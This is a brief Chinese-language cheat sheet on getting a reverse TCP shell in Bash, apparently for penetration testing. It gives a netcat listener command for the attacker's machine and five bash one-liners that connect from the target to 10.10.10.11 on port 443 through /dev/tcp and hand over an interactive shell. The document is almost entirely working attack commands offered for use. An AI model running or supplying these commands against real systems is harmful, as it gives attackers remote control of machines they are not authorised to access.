# Bash环境下反弹TCP协议shell


首先在本地监听TCP协议443端口

```bash
nc -lvp 443

```

然后在靶机上执行如下命令：

```bash
bash -i >& /dev/tcp/10.10.10.11/443 0>&1

```

```bash
/bin/bash -i > /dev/tcp/10.10.10.11/443 0<& 2>&1

```

```bash
exec 5<>/dev/tcp/10.10.10.11/443;cat <&5 | while read line; do $line 2>&5 >&5; done

```

```bash
exec /bin/sh 0</dev/tcp/10.10.10.11/443 1>&0 2>&0

```

```bash
0<&196;exec 196<>/dev/tcp/10.10.10.11/443; sh <&196 >&196 2>&196

```

